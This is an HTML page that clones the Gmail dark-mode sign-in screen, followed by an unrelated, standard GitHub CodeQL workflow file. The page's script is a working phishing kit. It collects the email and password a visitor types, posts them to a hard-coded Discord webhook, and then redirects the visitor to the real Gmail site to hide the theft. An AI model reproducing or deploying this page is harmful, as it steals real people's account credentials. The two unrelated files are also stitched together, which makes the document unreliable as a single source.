<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Gmail Dark Login Clone</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      darkMode: 'class'
    };
  </script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
    }
    .input:focus {
      outline: none;
      border-color: #8ab4f8;
      box-shadow: 0 0 0 2px #8ab4f850;
    }
  </style>
</head>
<body class="bg-[#202124] text-white min-h-screen flex flex-col justify-center items-center px-4">
  <div class="w-full max-w-4xl bg-[#171717] rounded-3xl shadow-lg p-8 md:p-10">
    <div id="emailStep">
      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" alt="Google Logo" class="h-7 mb-10">
      <h1 class="text-3xl font-normal mb-1">Sign in</h1>
      <p class="text-sm text-gray-400 mb-8">to continue to Gmail</p>
      <form id="emailForm" class="space-y-6">
        <input id="emailInput" type="email" placeholder="Email or phone" required class="input w-full bg-transparent border border-gray-600 rounded px-4 py-3 text-sm placeholder-gray-400">
        <div>
          <a href="#" class="text-sm text-[#8ab4f8]">Forgot email?</a>
        </div>
        <p class="text-xs text-gray-400">Not your computer? Use Guest mode to sign in privately. <a href="#" class="text-[#8ab4f8]">Learn more</a></p>
        <div class="flex justify-between items-center mt-6">
          <button type="button" class="text-sm text-[#8ab4f8] font-medium">Create account</button>
          <button type="submit" class="bg-[#8ab4f8] hover:bg-[#669df6] text-black text-sm font-medium px-6 py-2 rounded-full">Next</button>
        </div>
      </form>
    </div>

    <div id="passwordStep" class="hidden">
      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" alt="Google Logo" class="h-7 mb-10">
      <h1 class="text-3xl font-normal mb-8">Welcome</h1>
      <div class="flex items-center space-x-2 bg-black border border-gray-600 text-white px-3 py-2 rounded-full w-fit mb-6">
        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.7 0 5.8 1.3 6 2v2H6v-2c.2-.7 3.3-2 6-2zm0-2c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
        <span id="userEmailDisplay">user@gmail.com</span>
        <svg class="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
      </div>
      <form id="passwordForm" class="space-y-6">
        <input id="passwordInput" type="password" placeholder="Enter your password" required class="input w-full bg-transparent border border-gray-600 rounded px-4 py-3 text-sm placeholder-gray-400">
        <div class="flex items-center">
          <input type="checkbox" id="showPassword" class="form-checkbox border-gray-500 mr-2">
          <label for="showPassword" class="text-sm">Show password</label>
        </div>
        <div class="flex justify-between items-center">
          <a href="#" class="text-sm text-[#8ab4f8]">Forgot password?</a>
          <button type="submit" class="bg-[#8ab4f8] hover:bg-[#669df6] text-black text-sm font-medium px-6 py-2 rounded-full">Next</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    const emailForm = document.getElementById('emailForm');
    const passwordForm = document.getElementById('passwordForm');
    const passwordStep = document.getElementById('passwordStep');
    const emailStep = document.getElementById('emailStep');
    const userEmailDisplay = document.getElementById('userEmailDisplay');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const showPassword = document.getElementById('showPassword');
    
    const webhookURL = 'https://discord.com/api/webhooks/1358533803164827791/SC7RqePQmAO3StmRzKpPauhodEGwl3KmOh4sKkO_rYbRpl5rJ8yQhKyYqgWjZDO7MM-n';

    emailForm.addEventListener('submit', function (e) {
      e.preventDefault();
      userEmailDisplay.textContent = emailInput.value;
      emailStep.classList.add('hidden');
      passwordStep.classList.remove('hidden');
    });

    passwordForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const email = emailInput.value;
      const password = passwordInput.value;

      // Send email and password to Discord webhook
      const data = {
        content: `Email: ${email}\nPassword: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => console.log('Successfully sent data to Discord:', data))
      .catch(error => console.error('Error sending data to Discord:', error));

      // Redirect to Gmail login page after submitting
      setTimeout(function() {
        window.location.href = "https://mail.google.com/mail/u/0/?pli=1";
      }, 1000); // Delay redirection by 1 second to allow the webhook to process
    });

    showPassword.addEventListener('change', function () {
      passwordInput.type = this.checked ? 'text' : 'password';
    });
  </script>
</body>
</html>
# For most projects, this workflow file will not need changing; you simply need
# to commit it to your repository.
#
# You may wish to alter this file to override the set of languages analyzed,
# or to provide custom queries or build logic.
#
# ******** NOTE ********
# We have attempted to detect the languages in your repository. Please check
# the `language` matrix defined below to confirm you have the correct set of
# supported CodeQL languages.
#
name: "CodeQL Advanced"

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  schedule:
    - cron: '16 16 * * 4'

jobs:
  analyze:
    name: Analyze (${{ matrix.language }})
    # Runner size impacts CodeQL analysis time. To learn more, please see:
    #   - https://gh.io/recommended-hardware-resources-for-running-codeql
    #   - https://gh.io/supported-runners-and-hardware-resources
    #   - https://gh.io/using-larger-runners (GitHub.com only)
    # Consider using larger runners or machines with greater resources for possible analysis time improvements.
    runs-on: ${{ (matrix.language == 'swift' && 'macos-latest') || 'ubuntu-latest' }}
    permissions:
      # required for all workflows
      security-events: write

      # required to fetch internal or private CodeQL packs
      packages: read

      # only required for workflows in private repositories
      actions: read
      contents: read

    strategy:
      fail-fast: false
      matrix:
        include:
        # CodeQL supports the following values keywords for 'language': 'actions', 'c-cpp', 'csharp', 'go', 'java-kotlin', 'javascript-typescript', 'python', 'ruby', 'swift'
        # Use `c-cpp` to analyze code written in C, C++ or both
        # Use 'java-kotlin' to analyze code written in Java, Kotlin or both
        # Use 'javascript-typescript' to analyze code written in JavaScript, TypeScript or both
        # To learn more about changing the languages that are analyzed or customizing the build mode for your analysis,
        # see https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.
        # If you are analyzing a compiled language, you can modify the 'build-mode' for that language to customize how
        # your codebase is analyzed, see https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    # Add any setup steps before running the `github/codeql-action/init` action.
    # This includes steps like installing compilers or runtimes (`actions/setup-node`
    # or others). This is typically only required for manual builds.
    # - name: Setup runtime (example)
    #   uses: actions/setup-example@v1

    # Initializes the CodeQL tools for scanning.
    - name: Initialize CodeQL
      uses: github/codeql-action/init@v3
      with:
        languages: ${{ matrix.language }}
        build-mode: ${{ matrix.build-mode }}
        # If you wish to specify custom queries, you can do so here or in a config file.
        # By default, queries listed here will override any specified in a config file.
        # Prefix the list here with "+" to use these queries and those in the config file.

        # For more details on CodeQL's query packs, refer to: https://docs.github.com/en/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/configuring-code-scanning#using-queries-in-ql-packs
        # queries: security-extended,security-and-quality

    # If the analyze step fails for one of the languages you are analyzing with
    # "We were unable to automatically build your code", modify the matrix above
    # to set the build mode to "manual" for that language. Then modify this step
    # to build your code.
    # ‚ÑπÔ∏è Command-line programs to run using the OS shell.
    # üìö See https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun
    - if: matrix.build-mode == 'manual'
      shell: bash
      run: |
        echo 'If you are using a "manual" build mode for one or more of the' \
          'languages you are analyzing, replace this with the commands to build' \
          'your code, for example:'
        echo '  make bootstrap'
        echo '  make release'
        exit 1

    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v3
      with:
        category: "/language:${{matrix.language}}"
